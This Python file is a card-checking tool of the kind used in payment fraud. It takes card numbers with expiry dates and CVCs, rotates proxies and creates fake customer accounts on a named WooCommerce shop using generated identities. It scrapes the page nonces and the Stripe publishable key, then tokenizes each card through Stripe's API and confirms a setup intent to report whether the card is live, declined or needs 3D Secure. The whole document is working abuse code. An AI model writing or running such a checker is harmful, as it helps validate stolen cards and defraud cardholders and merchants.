import asyncio
import aiohttp
import time
import re
import random
import datetime
import uuid
import json


def check_status(response_text):
    resp = str(response_text).lower()

    if '"success":true' in resp and '"status":"succeeded"' in resp:
        return "Card Added"

    if '"requires_action"' in resp or '"status":"requires_action"' in resp or "three_d_secure" in resp:
        return "3D requires_action"

    if '"declined"' in resp or "do_not_honor" in resp or "generic_decline" in resp or "insufficient_funds" in resp:
        return "Card was Declined"

    match = re.search(r'"message":"([^"]+)"', resp)
    if match:
        msg = match.group(1)
        if "declined" in msg.lower():
            return "Card was Declined"
        return msg

    return "unknown"


def extract_value(text, patterns):
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(1) if match.groups() else match.group(0)
    return None


async def VW(ccx, url=None, proxy_url=None, proxy_list=None, max_retries=3):
    for attempt in range(max_retries):
        px = proxy_url
        if proxy_list and attempt > 0:
            px = random.choice(proxy_list)
        result = await _VW_once(ccx, url, px)
        rl = str(result).lower()
        if "connectionpool" in rl or "proxyerror" in rl or "connect timeout" in rl or "connection error" in rl or "nonce not found" in rl or "pk not found" in rl:
            continue
        return result
    return result


async def _VW_once(ccx, url=None, proxy_url=None):
    ccx = str(ccx).strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Invalid card format"
    n = parts[0]
    mm = parts[1].zfill(2)
    yy = parts[2].strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    cvc = parts[3]

    if not url:
        url = "motherluckranch.com"

    URL = url.replace("https://", "").replace("http://", "").strip("/")

    def _format_proxy(p):
        if not p: return None
        ps = str(p).strip()
        if ps.startswith(("http://", "https://", "socks5://", "socks4://")): return ps
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
        return f"http://{ps}"

    formatted_proxy = _format_proxy(proxy_url)
    proxy_args = {"proxy": formatted_proxy} if formatted_proxy else {}

    guid = str(uuid.uuid4())
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    random_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

    try:
        from faker_gen import generate_fake_identity
        ident = generate_fake_identity("US")
        first_name = ident["firstName"]
        last_name = ident["lastName"]
        Temp_Mail = ident["email"]
    except Exception:
        first_name = "James"
        last_name = "Smith"
        digits = random.randint(100, 999999)
        Temp_Mail = f"james{digits}@gmail.com"

    headers = {
        'authority': URL,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': random_user_agent,
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

            # Step 1: Fetch My Account page for registration nonce
            try:
                async with session.get(f'https://{URL}/my-account/', headers=headers, **proxy_args) as resp:
                    html1 = await resp.text()
            except Exception as e:
                return f"Connection error: {str(e)[:50]}"

            reg_nonce_patterns = [
                r'id="woocommerce-register-nonce"\s+name="woocommerce-register-nonce"\s+value="([^"]+)"',
                r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
            ]
            reg_nonce = extract_value(html1, reg_nonce_patterns)

            if reg_nonce:
                reg_payload = {
                    'email': Temp_Mail,
                    'woocommerce-register-nonce': reg_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_headers = {
                    'authority': URL,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': f'https://{URL}',
                    'referer': f'https://{URL}/my-account/',
                    'user-agent': random_user_agent,
                }
                try:
                    async with session.post(f'https://{URL}/my-account/', headers=reg_headers, data=reg_payload, **proxy_args) as response:
                        await response.text()
                except Exception:
                    pass

            # Step 2: Fetch add-payment-method page
            pm_headers = {
                'authority': URL,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'referer': f'https://{URL}/my-account/payment-methods/',
                'user-agent': random_user_agent,
            }
            try:
                async with session.get(f'https://{URL}/my-account/add-payment-method/', headers=pm_headers, **proxy_args) as response:
                    pm_page_text = await response.text()
            except Exception as e:
                return f"Connection error: {str(e)[:50]}"

            confirm_nonce_patterns = [
                r'"createAndConfirmSetupIntentNonce":"([^"]+)"',
                r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
                r'"add_card_nonce":"([^"]+)"',
            ]
            confirm_nonce = extract_value(pm_page_text, confirm_nonce_patterns)

            pk_patterns = [
                r'"publishableKey":"([^"]+)"',
                r'pk_live_[a-zA-Z0-9]+',
            ]
            pk_value = extract_value(pm_page_text, pk_patterns)

            if not confirm_nonce:
                return "nonce not found"
            if not pk_value:
                return "pk not found"

            xox = extract_value(pm_page_text, [r'"account_id":"([^"]+)"'])

            # Step 3: Tokenize card via Stripe API
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': random_user_agent,
            }

            pm_data = {
                'type': 'card',
                'billing_details[name]': f"{first_name} {last_name}",
                'billing_details[email]': Temp_Mail,
                'billing_details[address][country]': 'US',
                'billing_details[address][postal_code]': '10001',
                'card[number]': n,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent',
                'referrer': f'https://{URL}',
                'time_on_page': str(random.randint(100000, 999999)),
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': pk_value,
                '_stripe_version': '2024-06-20'
            }

            if xox:
                pm_data['_stripe_account'] = xox

            try:
                async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=pm_data, **proxy_args) as response:
                    response_data = await response.json()
            except Exception as e:
                return f"Stripe PM error: {str(e)[:60]}"

            if 'error' in response_data:
                error_code = response_data['error'].get('code', '')
                if error_code == 'incorrect_number':
                    return "Card number invalid"
                elif error_code == 'invalid_expiry_year':
                    return "Invalid expiry year"
                elif error_code == 'invalid_expiry_month':
                    return "Invalid expiry month"
                else:
                    return response_data['error'].get('message', 'Unknown error')

            pm_id = response_data.get('id')
            if not pm_id:
                return "PM creation failed"

            # Step 4: Confirm Setup Intent on WooCommerce
            confirm_headers = {
                'authority': URL,
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': f'https://{URL}',
                'referer': f'https://{URL}/my-account/add-payment-method/',
                'user-agent': random_user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }

            params1 = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
            data1 = {'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': confirm_nonce}
            params2 = {'wc-ajax': 'wc_stripe_create_setup_intent'}
            data2 = {'stripe_source_id': pm_id, 'nonce': confirm_nonce}

            endpoints = [
                ('post', f'https://{URL}', params1, data1),
                ('post', f'https://{URL}/', params2, data2),
                ('post', f'https://{URL}/wp-admin/admin-ajax.php', params2, data2),
            ]

            msg = ""
            for method, ep_url, params, data in endpoints:
                try:
                    async with session.post(ep_url, params=params, headers=confirm_headers, data=data, **proxy_args) as r:
                        text = await r.text()
                        msg = check_status(text)
                        if msg in ["Card Added", "3D requires_action", "Card was Declined"]:
                            return msg
                except Exception:
                    continue

            return msg if msg else "unknown"

    except asyncio.TimeoutError:
        return "Timeout error"
    except Exception as e:
        return f"Unexpected error: {str(e)[:60]}"
